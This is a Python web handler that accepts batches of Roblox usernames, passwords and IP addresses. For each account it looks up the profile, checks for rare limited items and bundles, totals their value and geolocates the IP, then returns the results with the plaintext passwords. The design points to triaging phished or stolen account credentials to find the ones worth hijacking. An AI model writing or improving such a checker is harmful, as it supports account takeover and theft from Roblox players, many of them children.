from http.server import BaseHTTPRequestHandler
import urllib.request
import urllib.error
import concurrent.futures
import json
import time

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
VERIFIED_IDS = (102611803, 1567446)

WORN_SPECIAL_ASSETS = {
    139607718: ("Korblox Deathspeaker", 17000),
    139607673: ("Korblox Deathspeaker", 17000),
    139607570: ("Korblox Deathspeaker", 17000),
    139607625: ("Korblox Deathspeaker", 17000),
    139607770: ("Korblox Deathspeaker", 17000),
    1509305368: ("Headless Horseman", 31000),
    134082579: ("Headless Horseman", 31000),
    2807146071: ("Malivinius", 300),
    2807143328: ("Malivinius", 300),
    2807147467: ("Malivinius", 300),
    2807149259: ("Malivinius", 300),
    2807148506: ("Malivinius", 300),
    1402432199: ("Violet Valkyrie", 50000),
    124730194: ("Blackvalk", 25000),
    151789690: ("Ice Valkyrie", 45000),
    1365767: ("Valkyrie Helm", 20000),
    8329438: ("Stitchface", 4000),
    131144461: ("Extreme Headphones", 7500),
    1235488: ("Clockwork's Headphones", 15000),
    1029025: ("Workclock Headphones", 3000),
}

def req_json(url, method="GET", body=None, timeout=3.5):
    for attempt in range(3):
        try:
            req = urllib.request.Request(url, data=body, headers=HEADERS, method=method)
            if body is not None:
                req.add_header("Content-Type", "application/json")
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status, json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as he:
            if he.code == 429 and attempt < 2:
                time.sleep(0.35 * (attempt + 1))
                continue
            return he.code, {}
        except Exception:
            if attempt < 2:
                time.sleep(0.15)
                continue
            return 0, {}
    return 0, {}

def bulk_resolve_users(usernames):
    resolved = {}
    clean = [u.strip() for u in usernames if u and u.strip()]
    for i in range(0, len(clean), 100):
        chunk = clean[i:i+100]
        payload = json.dumps({"usernames": chunk, "excludeBannedUsers": False}).encode("utf-8")
        st, data = req_json("https://users.roblox.com/v1/usernames/users", "POST", payload, timeout=4.0)
        if st == 200 and isinstance(data, dict):
            for entry in data.get("data", []):
                req_u = (entry.get("requestedUsername") or entry.get("name") or "").lower()
                if req_u and entry.get("id"):
                    resolved[req_u] = entry["id"]
    return resolved

def bulk_avatars(uids):
    avatars = {}
    valid = [u for u in uids if u]
    for i in range(0, len(valid), 100):
        chunk = ",".join(str(u) for u in valid[i:i+100])
        st, data = req_json(
            f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={chunk}&size=150x150&format=Png&isCircular=false",
            timeout=3.5
        )
        if st == 200 and isinstance(data, dict):
            for item in data.get("data", []):
                if item.get("targetId") and item.get("imageUrl"):
                    avatars[item["targetId"]] = item["imageUrl"]
    return avatars

def bulk_ips(ips):
    ip_map = {}
    unique_ips = list({ip.strip() for ip in ips if ip and ip.strip()})
    for i in range(0, len(unique_ips), 100):
        chunk = unique_ips[i:i+100]
        payload = json.dumps([{"query": ip, "fields": "query,status,country"} for ip in chunk]).encode("utf-8")
        st, data = req_json("http://ip-api.com/batch", "POST", payload, timeout=3.0)
        if st == 200 and isinstance(data, list):
            for row in data:
                if row.get("status") == "success" and row.get("query"):
                    ip_map[row["query"]] = row.get("country") or "-"
    return ip_map

def check_item(uid, item_type, item_id):
    st, data = req_json(f"https://inventory.roblox.com/v1/users/{uid}/items/{item_type}/{item_id}", timeout=3.0)
    return st == 200 and isinstance(data, dict) and len(data.get("data", [])) > 0

def scan_batch(accounts):
    if not accounts:
        return []

    usns = [a.get("usn", "") for a in accounts]
    ips = [a.get("ip", "") for a in accounts]

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
        fut_users = ex.submit(bulk_resolve_users, usns)
        fut_ips = ex.submit(bulk_ips, ips)
        user_map = fut_users.result()
        ip_map = fut_ips.result()

    uids = [user_map.get(u.strip().lower()) for u in usns]
    avatar_map = bulk_avatars(uids)

    tasks = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        for idx, uid in enumerate(uids):
            if not uid:
                continue
            tasks[(idx, "col")] = ex.submit(req_json, f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100")
            tasks[(idx, "av")] = ex.submit(req_json, f"https://avatar.roblox.com/v1/users/{uid}/avatar")
            tasks[(idx, "hat1")] = ex.submit(check_item, uid, "Asset", VERIFIED_IDS[0])
            tasks[(idx, "hat2")] = ex.submit(check_item, uid, "Asset", VERIFIED_IDS[1])
            tasks[(idx, "korblox")] = ex.submit(check_item, uid, "Bundle", 192)
            tasks[(idx, "headless")] = ex.submit(check_item, uid, "Bundle", 201)
            tasks[(idx, "malivinius_b")] = ex.submit(check_item, uid, "Bundle", 334)
            tasks[(idx, "malivinius_a")] = ex.submit(check_item, uid, "Asset", 2807146071)

        done = {k: fut.result() for k, fut in tasks.items()}

    results = []
    for idx, acc in enumerate(accounts):
        usn = (acc.get("usn") or "").strip()
        pw = acc.get("pw") or ""
        ip = (acc.get("ip") or "").strip()
        uid = uids[idx]

        out = {
            "usn": usn,
            "pw": pw,
            "ip": ip,
            "uid": uid,
            "has_verified": False,
            "total_rap": 0,
            "bundle_value": 0,
            "limited_items": [],
            "is_private": False, "rate_limited": False,
            "avatar": avatar_map.get(uid, "") if uid else "",
            "location": ip_map.get(ip, "-") if ip else "-"
        }
        if not uid:
            results.append(out)
            continue

        found_names = set()
        bundle_val = 0
        limited_items = []

        st_av, av_data = done.get((idx, "av"), (0, {}))
        if st_av == 200 and isinstance(av_data, dict):
            for a in av_data.get("assets", []):
                aid = a.get("id")
                aname = (a.get("name") or "").lower()
                if aid in VERIFIED_IDS:
                    out["has_verified"] = True
                if aid in WORN_SPECIAL_ASSETS:
                    nm, val = WORN_SPECIAL_ASSETS[aid]
                    if nm not in found_names:
                        found_names.add(nm)
                        bundle_val += val
                        limited_items.append({"name": nm, "rap": val, "is_bundle": True})
                elif "malivinius" in aname and "Malivinius" not in found_names:
                    found_names.add("Malivinius")
                    bundle_val += 300
                    limited_items.append({"name": "Malivinius", "rap": 300, "is_bundle": True})

        st_col, col_data = done.get((idx, "col"), (0, {}))
        if st_col == 429 or st_col == 0:
            out["rate_limited"] = True
        if st_col == 403:
            out["is_private"] = True
            out["bundle_value"] = bundle_val
            out["limited_items"] = limited_items
            results.append(out)
            continue

        if st_col == 200 and isinstance(col_data, dict):
            for it in col_data.get("data", []):
                nm = it.get("name") or "Limited Item"
                rap = int(it.get("recentAveragePrice") or 0)
                out["total_rap"] += rap
                limited_items.append({"name": nm, "rap": rap, "is_bundle": False})

        if not out["has_verified"] and (done.get((idx, "hat1"), False) or done.get((idx, "hat2"), False)):
            out["has_verified"] = True
        if "Korblox Deathspeaker" not in found_names and done.get((idx, "korblox"), False):
            found_names.add("Korblox Deathspeaker")
            bundle_val += 17000
            limited_items.append({"name": "Korblox Deathspeaker", "rap": 17000, "is_bundle": True})
        if "Headless Horseman" not in found_names and done.get((idx, "headless"), False):
            found_names.add("Headless Horseman")
            bundle_val += 31000
            limited_items.append({"name": "Headless Horseman", "rap": 31000, "is_bundle": True})
        if "Malivinius" not in found_names and (done.get((idx, "malivinius_b"), False) or done.get((idx, "malivinius_a"), False)):
            found_names.add("Malivinius")
            bundle_val += 300
            limited_items.append({"name": "Malivinius", "rap": 300, "is_bundle": True})

        out["bundle_value"] = bundle_val
        out["limited_items"] = limited_items
        results.append(out)

    return results

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length).decode("utf-8") if length > 0 else "{}"
            payload = json.loads(raw)
        except Exception:
            payload = {}

        accounts = payload.get("accounts") or []
        results = scan_batch(accounts)
        body = json.dumps({"results": results}).encode("utf-8")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)
